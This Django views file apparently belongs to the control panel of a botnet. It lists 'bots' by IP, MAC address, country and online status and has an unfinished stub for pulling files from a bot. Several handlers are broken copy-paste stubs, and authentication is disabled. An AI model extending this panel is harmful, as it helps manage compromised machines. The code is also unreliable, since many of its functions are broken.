# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.shortcuts import render, redirect
from django.contrib.staticfiles.templatetags.staticfiles import static
from django.http import HttpResponse
from django.contrib.auth.decorators import login_required
from .models import Bot

app_static = static('panel/')
dummy_list_context = {
        'online_bots': 45,
        'offline_bots': 200,
        'total_bots': 245,
        'notifications': [
            'Mike John responded to your email',
            'You have 5 new tasks',
            'You\'re now friend with Andrew',
            'Another Notification',
            'Another One',
        ],
}

# Create your views here.

def register_super(request):
    html = 'superregister.html'
    context = {
    }
    return render(request, html, context)

def register_super_user(request):
    html = 'superregister.html'
    context = {
    }
    return render(request, html, context)

def register(request):
    html = 'register.html'
    context = {
    }
    return render(request, html, context)

def register_user(request):
    html = 'register.html'
    context = {
    }
    return render(request, html, context)

def login(request):
    html = 'login.html'
    context = {
    }
    return render(request, html, context)

def authenticate_user(request):
    from django.contrib.auth import authenticate
    username = request.POST['username']
    password = request.POST['password']
    user = authenticate(request, username=username, password=password)
    if user is not None:
        login(request, user)
        # Redirect to a success page.
        redirect(to='/')
    else:
        # Return an 'invalid login' error message.
        return HttpResponse('Invalid Credentials', status=401)

# @login_required(redirect_field_name='redirect_url', login_url='/login')
def index(request):
    html = 'index.html'
    context = {
    }
    return render(request, html, context)

def about_us(request):
    html = 'index.html'
    context = {
    }
    return render(request, html, context)

def services(request):
    html = 'index.html'
    context = {
    }
    return render(request, html, context)

# @login_required(redirect_field_name='redirect_url', login_url='/login')
def dashboard_index(request):
    html = 'dashboard.html'
    all_bots = list(Bot.objects.all()) # Query All
    online_bots = list(Bot.objects.filter(active=True)) # Query All Online
    offline_bots = list(Bot.objects.filter(active= not True)) # Query All Offline
    context = {
        'online_bots': len(online_bots),
        'offline_bots': len(offline_bots),
        'total_bots': len(all_bots),
        'bots': all_bots
    }
    return render(request, html, context)

def online_bots(request):
    html = 'online_bots.html'
    all_bots = list(Bot.objects.all()) # Query All
    online_bots = list(Bot.objects.filter(active=True)) # Query All Online
    offline_bots = list(Bot.objects.filter(active= not True)) # Query All Offline
    context = {
        'online_bots': len(online_bots),
        'offline_bots': len(offline_bots),
        'total_bots': len(all_bots),
        'bots': online_bots
    }
    return render(request, html, context)

def offline_bots(request):
    html = 'offline_bots.html'
    all_bots = list(Bot.objects.all()) # Query All
    online_bots = list(Bot.objects.filter(active=True)) # Query All Online
    offline_bots = list(Bot.objects.filter(active= not True)) # Query All Offline
    context = {
        'online_bots': len(online_bots),
        'offline_bots': len(offline_bots),
        'total_bots': len(all_bots),
        'bots': offline_bots
    }
    return render(request, html, context)

def bot_detail(request, id):
    html = 'bot_detail.html'
    bot = Bot.objects.get(id=id)  # Query By id
    context = {
        'bot_name': bot.name,
        'bot_ip': bot.ip_address,
        'bot_mac': bot.mac_address,
        'bot_country': bot.country,
        'bot_continent': bot.continent,
        'bot_created_at': bot.created_at,
        'bot_last_active': bot.last_active,
        'bot_active': bot.active
    }
    return render(request, html, context)

def bot_delete(request, id):
    bot = Bot.objects.get(id=id)  # Query By id
    try:
        bot.delete()
    except:
        return HttpResponse(status=500)
    return HttpResponse(status=200)

def bot_register(request):
    bot = Bot.objects.get(id=id)  # Query By id
    try:
        bot.delete()
    except:
        return HttpResponse(status=500)
    return HttpResponse(status=200)

def bot_active(request):
    bot = Bot.objects.get(id=id)  # Query By id
    try:
        bot.delete()
    except:
        return HttpResponse(status=500)
    return HttpResponse(status=200)

def bot_offline(request):
    bot = Bot.objects.get(id=id)  # Query By id
    try:
        bot.delete()
    except:
        return HttpResponse(status=500)
    return HttpResponse(status=200)

def bot_downloadfiles(request, id):
    bot = Bot.objects.get(id=id, active=True)  # Query By id
    # Communicate with bot